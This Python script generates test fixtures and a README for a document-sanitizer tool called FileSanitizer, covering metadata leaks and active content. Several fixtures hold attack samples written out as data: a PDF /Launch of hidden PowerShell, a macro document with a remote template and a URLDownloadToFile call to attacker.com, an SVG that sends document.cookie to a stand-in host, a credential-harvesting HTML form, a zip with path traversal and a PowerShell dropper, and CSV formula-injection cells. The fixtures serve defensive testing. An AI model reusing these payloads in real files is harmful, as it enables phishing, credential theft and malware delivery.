import os
import zipfile
from pathlib import Path
from PIL import Image
from PIL.TiffImagePlugin import IFDRational
import fitz

BASE_DIR = Path(__file__).parent.resolve()

def create_image_with_gps():
    img_path = BASE_DIR / "image_gps_exif_metadata.jpg"
    img = Image.new("RGB", (640, 480), color=(70, 130, 180))
    exif = img.getexif()

    # Hardware & Software EXIF tags
    exif[0x010F] = "Sony"                                       # Make
    exif[0x0110] = "ILCE-7M4 (Alpha 7 IV)"                      # Model
    exif[0x0131] = "Adobe Photoshop Lightroom Classic 13.2"    # Software
    exif[0x013B] = "Jane Doe (Security Analyst)"                # Artist
    exif[0x8298] = "Copyright (c) 2026 Jane Doe. All Rights"   # Copyright
    exif[0x0132] = "2026:03:15 14:22:45"                       # DateTimeOriginal

    # GPS IFD coordinates (Stockholm City Hall: 59°19'45" N, 18°04'07" E)
    gps_ifd = exif.get_ifd(0x8825)
    gps_ifd[1] = "N"
    gps_ifd[2] = (IFDRational(59, 1), IFDRational(19, 1), IFDRational(45, 1))
    gps_ifd[3] = "E"
    gps_ifd[4] = (IFDRational(18, 1), IFDRational(4, 1), IFDRational(7, 1))

    img.save(img_path, format="JPEG", exif=exif, quality=95)
    print(f"Created: {img_path.name}")

def create_clean_image():
    img_path = BASE_DIR / "clean_image.png"
    img = Image.new("RGB", (200, 200), color=(46, 204, 113))
    img.save(img_path, format="PNG")
    print(f"Created: {img_path.name}")

def create_suspicious_pdf():
    pdf_path = BASE_DIR / "suspicious_javascript_actions.pdf"
    doc = fitz.open()

    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (50, 70),
        "URGENT WIRE TRANSFER AUTHORIZATION\n\n"
        "Please review the attached invoice details below.\n"
        "Verify credentials at: https://secure-login.untrusted-verify.xyz/auth\n"
        "Support portal: https://external-cloud-service.com/help\n",
        fontsize=12
    )

    doc.set_metadata({
        "title": "Confidential Wire Transfer Notice",
        "author": "Dr. Malicious Sender",
        "subject": "Exfiltration Test",
        "creator": "Adobe Acrobat Pro 2024",
        "producer": "FileSanitizer Generator",
        "keywords": "wire, invoice, confidential, banking"
    })

    # Embedded file attachment
    doc.embfile_add("confidential_payroll.csv", b"EmployeeID,Name,Salary\n101,John Doe,125000\n102,Jane Smith,135000\n", filename="confidential_payroll.csv")
    doc.save(str(pdf_path))
    doc.close()

    # Append raw JavaScript trigger and Launch action into the PDF stream
    raw = pdf_path.read_bytes()
    injected = raw + (
        b"\n/JavaScript << /JS (app.alert('Warning: FileSanitizer Embedded PDF JavaScript Test Payload!');) >>\n"
        b"/Launch << /F (powershell.exe) /P (-NoP -NonI -W Hidden -Exec Bypass) >>\n"
        b"/OpenAction << /S /JavaScript /JS (app.alert('OpenAction Triggered');) >>\n"
    )
    pdf_path.write_bytes(injected)
    print(f"Created: {pdf_path.name}")

def create_clean_pdf():
    pdf_path = BASE_DIR / "clean_document.pdf"
    doc = fitz.open()
    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (50, 80),
        "Project Architecture & Implementation Overview\n\n"
        "This is a benign, clean document with standard static text.\n"
        "It contains no JavaScript, no macros, no attachments, and no external trackers.\n",
        fontsize=12
    )
    doc.save(str(pdf_path))
    doc.close()
    print(f"Created: {pdf_path.name}")

def create_macro_office_document():
    docm_path = BASE_DIR / "office_vba_macro_template_injection.docm"
    with zipfile.ZipFile(docm_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml specifying macroEnabled document
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>\n'
            '  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>\n'
            '</Types>'
        ))

        # _rels/.rels with remote template injection
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://c2-infrastructure.malicious-domain.xyz/templates/exploit.dotm" TargetMode="External"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>\n'
            '</Relationships>'
        ))

        # word/document.xml
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>URGENT: Please enable macros to view protected financial contents.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))

        # Embedded VBA project stream (with standard AutoOpen / Document_Open hook tokens)
        mock_vba = (
            b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" +
            b"Attacker Macro Stream vbaProject\x00" +
            b"Sub AutoOpen()\x00" +
            b"  Shell('calc.exe')\x00" +
            b"  URLDownloadToFile('http://attacker.com/bin', 'payload.exe')\x00" +
            b"End Sub\x00"
        )
        zf.writestr("word/vbaProject.bin", mock_vba)

        # docProps/core.xml metadata
        zf.writestr("docProps/core.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
            '  <dc:title>Overdue Invoice #9401</dc:title>\n'
            '  <dc:creator>APT Group 29</dc:creator>\n'
            '</cp:coreProperties>'
        ))
    print(f"Created: {docm_path.name}")

def create_clean_office_document():
    docx_path = BASE_DIR / "clean_office_document.docx"
    with zipfile.ZipFile(docx_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
            '</Relationships>'
        ))
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>Quarterly Meeting Minutes. All systems operational.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))
    print(f"Created: {docx_path.name}")

def create_active_svg():
    svg_path = BASE_DIR / "active_content_xss.svg"
    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" viewBox="0 0 400 300">
    <rect width="100%" height="100%" fill="#f1f5f9"/>
    <circle cx="200" cy="150" r="80" fill="#ef4444" onload="alert('XSS: SVG DOM onload executed!');"/>
    
    <!-- Script Execution -->
    <script type="text/javascript">
        console.warn("Active script payload in SVG vector container.");
        window.location.href = "https://phishing-portal.malicious-site.xyz/exfiltrate?cookie=" + document.cookie;
    </script>
    
    <!-- JavaScript Pseudo-Protocol Link -->
    <a xlink:href="javascript:alert('JavaScript URL Triggered');">
        <text x="200" y="270" text-anchor="middle" font-size="14" fill="#0f172a">Click for Special Promotion</text>
    </a>
    
    <!-- External Reference -->
    <image xlink:href="http://tracker.remote-beacon.xyz/pixel.png" width="1" height="1"/>
</svg>"""
    svg_path.write_text(svg_content, encoding="utf-8")
    print(f"Created: {svg_path.name}")

def create_phishing_html():
    html_path = BASE_DIR / "phishing_login_with_iframes.html"
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30;url=http://attacker-redirect.xyz/landing">
    <title>Urgent Security Verification</title>
    <script>
        function exfiltrateCredentials() {
            var user = document.getElementById('username').value;
            fetch('http://exfil.remote-server.xyz/keys?u=' + encodeURIComponent(user));
        }
    </script>
</head>
<body onload="console.log('Phishing page loaded');">
    <h2>Corporate Account Verification</h2>
    <p>Please enter your corporate single sign-on credentials below:</p>
    
    <form action="http://malicious-login-collector.xyz/login.php" method="POST" onsubmit="exfiltrateCredentials();">
        <label>Corporate Email: <input type="text" id="username" name="email"></label><br><br>
        <label>Domain Password: <input type="password" name="password"></label><br><br>
        <input type="submit" value="Verify Identity">
    </form>

    <h3>Internal Portal Mirror:</h3>
    <iframe src="https://example.com" width="600" height="300" style="border:1px solid #ccc;"></iframe>
</body>
</html>"""
    html_path.write_text(html_content, encoding="utf-8")
    print(f"Created: {html_path.name}")

def create_dangerous_archive():
    zip_path = BASE_DIR / "dangerous_archive_with_traversal.zip"
    with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # Directory traversal payload
        zf.writestr("../../etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n")
        # Script payload
        zf.writestr("powershell_dropper.ps1", "powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest -Uri http://malicious.xyz/payload.exe -OutFile C:\\temp\\evil.exe'\n")
        # Executable batch script
        zf.writestr("setup_installer.bat", "@echo off\necho Installing backdoor...\nstart /b powershell_dropper.ps1\n")
        # Harmless readme
        zf.writestr("read_me_first.txt", "Please execute setup_installer.bat to proceed with update installation.\n")
    print(f"Created: {zip_path.name}")

def create_eicar_test_file():
    eicar_path = BASE_DIR / "eicar_standard_av_test.txt"
    eicar_string = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    eicar_path.write_bytes(eicar_string)
    print(f"Created: {eicar_path.name}")

def create_spreadsheet_injection_csv():
    csv_path = BASE_DIR / "spreadsheet_formula_injection.csv"
    csv_content = (
        "Employee_ID,Full_Name,Department,Salary,Notes\n"
        "E-1001,John Smith,Engineering,95000,Approved promotion\n"
        "=cmd|'/C calc.exe'!A0,Alice Johnson,Finance,120000,DDE Execution Injection Test Cell\n"
        "+powershell.exe -enc ZWNobyAnaGVsbG8n,Bob Miller,Security,110000,Formula Prefix Plus Command\n"
        "@SUM(1+1)*cmd|'/C notepad.exe'!A0,Carol White,Human Resources,85000,Formula Prefix At Command\n"
        "E-1005,David Brown,Marketing,78000,Standard benign row\n"
    )
    csv_path.write_text(csv_content, encoding="utf-8")
    print(f"Created: {csv_path.name}")

def create_pdf_with_body_and_metadata_links():
    pdf_path = BASE_DIR / "pdf_with_body_and_metadata_links.pdf"
    doc = fitz.open()

    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (50, 70),
        "GLOBAL CYBERSECURITY INCIDENT ADVISORY #2026-SEC-09\n\n"
        "Incident responders have observed credential harvesting and malicious link delivery.\n\n"
        "1. Main Incident Portal (Body Text Link):\n"
        "   https://security-portal.internal-defense.org/incident/9842\n\n"
        "2. Evidence Ingestion Endpoint (Body Text Link):\n"
        "   https://threat-evidence-drop.secure-vault.net/upload-sample\n\n"
        "3. Live Threat Telemetry Feed (Clickable Annotation below):\n",
        fontsize=11
    )

    # Clickable PDF URI link annotation
    link_rect = fitz.Rect(50, 210, 420, 235)
    page.draw_rect(link_rect, color=(0.2, 0.4, 0.8), width=1)
    page.insert_text((55, 227), ">> Click to Access Cloud Threat Investigation Sandbox <<", fontsize=10, color=(0.1, 0.3, 0.7))
    page.insert_link({
        "kind": fitz.LINK_URI,
        "from": link_rect,
        "uri": "https://investigation-sandbox.defense-cloud.io/verify-session"
    })

    # Embedded Metadata containing URLs across standard document properties
    doc.set_metadata({
        "title": "Incident Advisory Bulletin - https://bulletin-service.cyber-ops.org/alert/2026",
        "author": "SecOps Incident Lead - https://security-analyst.identity-provider.io/secops",
        "subject": "Threat Indicator Intelligence - https://threat-intel.global-registry.net/indicators",
        "keywords": "incident, advisory, forensics, https://metadata-taxonomy.security-hub.io/catalog",
        "creator": "Security Incident Engine v3.1",
        "producer": "PDF Security Toolkit - https://build-tools.document-pipeline.org/engine"
    })

    doc.save(str(pdf_path))
    doc.close()
    print(f"Created: {pdf_path.name}")

def create_office_with_body_and_metadata_links():
    docx_path = BASE_DIR / "office_with_body_and_metadata_links.docx"
    with zipfile.ZipFile(docx_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
            '  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>\n'
            '</Types>'
        ))

        # _rels/.rels
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>\n'
            '</Relationships>'
        ))

        # word/_rels/document.xml.rels with External Hyperlink Relationship
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rIdHyperlink1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="https://partner-portal.audit-verification.com/external-review" TargetMode="External"/>\n'
            '  <Relationship Id="rIdHyperlink2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="https://cloud-storage.vendor-intake.net/shared-dossier" TargetMode="External"/>\n'
            '</Relationships>'
        ))

        # word/document.xml containing body text URLs and clickable hyperlinks
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>Corporate Governance and Compliance Audit 2026</w:t></w:r></w:p>\n'
            '    <w:p><w:r><w:t>Please review the audited policy guidelines directly at our internal wiki: '
            'https://compliance-portal.enterprise-network.org/guidelines-2026</w:t></w:r></w:p>\n'
            '    <w:p><w:r><w:t>Direct data export mirror: https://mirror-export.enterprise-network.org/archive.csv</w:t></w:r></w:p>\n'
            '    <w:p>\n'
            '      <w:hyperlink r:id="rIdHyperlink1">\n'
            '        <w:r><w:t>[Click to Access External Audit Verification Portal]</w:t></w:r>\n'
            '      </w:hyperlink>\n'
            '    </w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))

        # docProps/core.xml containing metadata URLs in creator, title, description, keywords
        zf.writestr("docProps/core.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">\n'
            '  <dc:title>Annual Compliance Audit - https://audit-reports.enterprise-network.org/2026</dc:title>\n'
            '  <dc:creator>Chief Compliance Officer - https://executive-directory.enterprise-network.org/cco</dc:creator>\n'
            '  <dc:description>Audited documentation with remote validation ledger at https://blockchain-ledger.audit-trail.org/tx/8812</dc:description>\n'
            '  <cp:keywords>compliance, audit, governance, https://regulatory-taxonomy.standards-board.org/rules</cp:keywords>\n'
            '  <cp:lastModifiedBy>Lead Auditor https://auditors.enterprise-network.org/profile</cp:lastModifiedBy>\n'
            '</cp:coreProperties>'
        ))
    print(f"Created: {docx_path.name}")

def create_image_with_metadata_links():
    img_path = BASE_DIR / "image_with_metadata_links.jpg"
    img = Image.new("RGB", (640, 480), color=(52, 73, 94))
    exif = img.getexif()

    # Hardware, Author, Copyright, and Description with embedded URLs
    exif[0x010F] = "Nikon Corporation"
    exif[0x0110] = "NIKON Z8 (Telemetry: https://camera-telemetry.nikon-imaging.net/sync)"
    exif[0x0131] = "Adobe Photoshop 2026 (Service: https://adobe-cloud.creative-sync.com/plugin)"
    exif[0x013B] = "Freelance Photojournalist (Portfolio: https://portfolio.visual-journalism.org/profile)"
    exif[0x8298] = "Copyright (c) 2026 All Rights Reserved - License: https://licensing.creative-media-network.org/commercial-use"
    exif[0x010E] = "Field capture. Provenance verification: https://asset-provenance.content-authenticity.net/verify/img-9021"
    exif[0x9286] = "Automated ingestion pipeline by https://photo-ingest.media-pipeline.io/v2"  # UserComment

    # Save with EXIF and comment dictionary
    img.save(
        img_path,
        format="JPEG",
        exif=exif,
        quality=95,
        comment="Direct CDN mirror: https://cdn-mirror.photo-vault.org/originals/2026/img-9021.raw"
    )
    print(f"Created: {img_path.name}")

def create_svg_with_body_and_metadata_links():
    svg_path = BASE_DIR / "svg_with_body_and_metadata_links.svg"
    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="350" viewBox="0 0 500 350">
    <!-- SVG Metadata Block containing URLs -->
    <metadata>
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
            <rdf:Description>
                <dc:title>Network Topology Diagram - https://diagrams.enterprise-architecture.org/topo-42</dc:title>
                <dc:creator>Enterprise Architect https://architects.cloud-systems.io/profile</dc:creator>
                <dc:source>Asset Repository https://design-source.vector-repository.org/asset/881</dc:source>
            </rdf:Description>
        </rdf:RDF>
    </metadata>

    <rect width="100%" height="100%" fill="#f8fafc"/>
    <text x="50" y="50" font-family="sans-serif" font-size="16" font-weight="bold" fill="#0f172a">Enterprise Infrastructure Topology</text>
    
    <!-- Body Text URLs -->
    <text x="50" y="90" font-family="sans-serif" font-size="12" fill="#475569">Documentation: https://docs.internal-infrastructure.net/topology</text>
    <text x="50" y="120" font-family="sans-serif" font-size="12" fill="#475569">Metrics Gateway: https://metrics.monitoring-hub.org/dash</text>
    
    <!-- Clickable Interactive Vector Link -->
    <a xlink:href="https://interactive-dashboard.cloud-portal.net/viewer" target="_blank">
        <rect x="50" y="160" width="320" height="40" rx="6" fill="#2563eb"/>
        <text x="210" y="185" text-anchor="middle" font-family="sans-serif" font-size="13" fill="#ffffff" font-weight="600">Open Live Interactive Telemetry</text>
    </a>
</svg>"""
    svg_path.write_text(svg_content, encoding="utf-8")
    print(f"Created: {svg_path.name}")

def create_html_with_body_and_metadata_links():
    html_path = BASE_DIR / "html_with_body_and_metadata_links.html"
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Software Release Bulletin #490</title>
    <!-- Metadata URLs in head tags -->
    <meta name="author" content="Release Engineering Team https://releaseteam.software-systems.org/team">
    <meta name="description" content="Official release dossier with verification at https://verification-ledger.software-systems.org/v2.4">
    <meta property="og:url" content="https://announcements.software-systems.org/2026/release-490">
    <link rel="canonical" href="https://canonical.software-systems.org/articles/release-490">
</head>
<body style="font-family: sans-serif; padding: 30px;">
    <h1>Release Bulletin v2.4.0</h1>
    <p>The latest build artifacts are now mirrored across global CDNs:</p>
    
    <!-- Body Text Links and Hyperlinks -->
    <ul>
        <li>Direct Binaries: <a href="https://downloads.developer-portal.org/v2/binaries.tar.gz">https://downloads.developer-portal.org/v2/binaries.tar.gz</a></li>
        <li>Checksum Manifest: <a href="https://security.developer-portal.org/checksums/v2.4.sha256">https://security.developer-portal.org/checksums/v2.4.sha256</a></li>
        <li>Changelog: https://github-mirrors.software-systems.org/changelogs/v2.4.md</li>
    </ul>
</body>
</html>"""
    html_path.write_text(html_content, encoding="utf-8")
    print(f"Created: {html_path.name}")

def create_readme():
    readme_path = BASE_DIR / "README.md"
    readme_content = """# FileSanitizer Test Files Suite

This directory contains test files specifically crafted to exercise FileSanitizer's security analyzers, Content Disarm & Reconstruction (CDR) engines, metadata extractors, URL reputation scanners, and antivirus detection.

| File Name | Intended Security Triggers | Expected App Reaction |
| :--- | :--- | :--- |
| `pdf_with_body_and_metadata_links.pdf` | **Links in Body & Metadata**: Contains body plain-text URLs, interactive PDF `/URI` link annotations, and embedded URLs across document metadata properties (`Author`, `Title`, `Subject`, `Keywords`, `Producer`). | All URLs from both document body and metadata are extracted, surfaced in the **URL Explorer**, and assessed for SSRF/reputation. Sanitizer strips metadata and disarms/flattens links. |
| `office_with_body_and_metadata_links.docx` | **Links in Body & Metadata**: Contains body text URLs, OpenXML external relationship hyperlinks (`rIdHyperlink1`, `rIdHyperlink2`), and metadata URLs in `docProps/core.xml` (`dc:creator`, `dc:title`, `dc:description`, `cp:keywords`). | Discovers external relationships and metadata links. Sanitizer purges external relationships and replaces core metadata with clean values. |
| `image_with_metadata_links.jpg` | **Links in Metadata**: Contains embedded URLs in EXIF tags (`Artist`, `Copyright`, `ImageDescription`, `UserComment`, `Software`) and image text comments. | URLs extracted to URL Explorer; metadata highlighted as **SENSITIVE**. Sanitization strips EXIF headers and re-encodes pixel buffer. |
| `svg_with_body_and_metadata_links.svg` | **Links in Body & Metadata**: Contains interactive `<a xlink:href>`, body `<text>` URLs, and `<metadata><rdf:RDF>` embedded Dublin Core URLs. | Detects external references and vector links. Sanitizer strips active links or converts SVG to safe rasterized PNG. |
| `html_with_body_and_metadata_links.html` | **Links in Body & Metadata**: Contains `<meta name="author">` and `<link rel="canonical">` metadata URLs, plus body anchor hyperlinks (`<a href>`) and text URLs. | Discovers all metadata and DOM URLs. Sanitizer strips links or renders sandboxed image/PDF. |
| `image_gps_exif_metadata.jpg` | Embedded GPS coordinates (Stockholm: 59°19'45" N, 18°04'07" E), Camera Hardware (Sony Alpha 7 IV), Author (Jane Doe), Software. | Detected in **Location** & **Camera** metadata tabs. Flagged as **SENSITIVE**. Sanitization strips EXIF/GPS and re-encodes. |
| `clean_image.png` | Standard clean PNG with zero metadata or scripts. | Evaluated as **CLEAN**. |
| `suspicious_javascript_actions.pdf` | Embedded JavaScript (`app.alert`), `/Launch` command, OpenAction trigger, external URL, and embedded CSV attachment. | Classified as **HIGH RISK**. Flags JS alert, Launch action, and attachments. "Maximum Sanitization" rasterizes pages to pure pixel images. |
| `clean_document.pdf` | Benign clean PDF document with plain text. | Evaluated as **CLEAN**. |
| `office_vba_macro_template_injection.docm` | Embedded VBA macro binary stream (`vbaProject.bin`), external template injection relationship (`attachedTemplate`), Author metadata. | Triggers prominent **MACROS DETECTED** banner. Classified as **HIGH RISK**. Sanitizer purges macro streams and neutralizes external rels. |
| `clean_office_document.docx` | Standard OpenXML document without macros or external targets. | Evaluated as **CLEAN**. |
| `active_content_xss.svg` | Embedded `<script>` block, inline `onload` DOM event handler, `javascript:` URI, and external tracker beacon image. | Flagged as active content risk. Sanitizer strips scripts or rasterizes to PNG. |
| `phishing_login_with_iframes.html` | Embedded `<iframe>`, credential `<form>`, inline scripts, and `<meta http-equiv="refresh">` redirect. | Flagged as interactive form & script risk. Sanitizer decomposes iframes, neutralizes forms, and strips scripts. |
| `dangerous_archive_with_traversal.zip` | Directory traversal entry (`../../etc/passwd`), executable batch script (`.bat`), and PowerShell payload (`.ps1`). | Flagged with **Critical Path Traversal** and **Executable Payload** findings. Sanitizer excludes dangerous members. |
| `eicar_standard_av_test.txt` | Standard, inert 68-character EICAR antivirus test signature. | ClamAV detects **`Eicar-Test-Signature`** with status **MALICIOUS**. Original download and standard sanitization are blocked. |
| `spreadsheet_formula_injection.csv` | CSV cells starting with formula execution prefixes (`=cmd\|...`, `+powershell...`, `@SUM...`). | Flagged as **Spreadsheet Formula Injection Detected**. Sanitizer escapes formula prefixes with leading quotes (`'`). |
"""
    readme_path.write_text(readme_content, encoding="utf-8")
    print(f"Created: {readme_path.name}")

if __name__ == "__main__":
    create_image_with_gps()
    create_clean_image()
    create_suspicious_pdf()
    create_clean_pdf()
    create_macro_office_document()
    create_clean_office_document()
    create_active_svg()
    create_phishing_html()
    create_dangerous_archive()
    create_eicar_test_file()
    create_spreadsheet_injection_csv()
    create_pdf_with_body_and_metadata_links()
    create_office_with_body_and_metadata_links()
    create_image_with_metadata_links()
    create_svg_with_body_and_metadata_links()
    create_html_with_body_and_metadata_links()
    create_readme()
    print("\nAll test files successfully generated!")

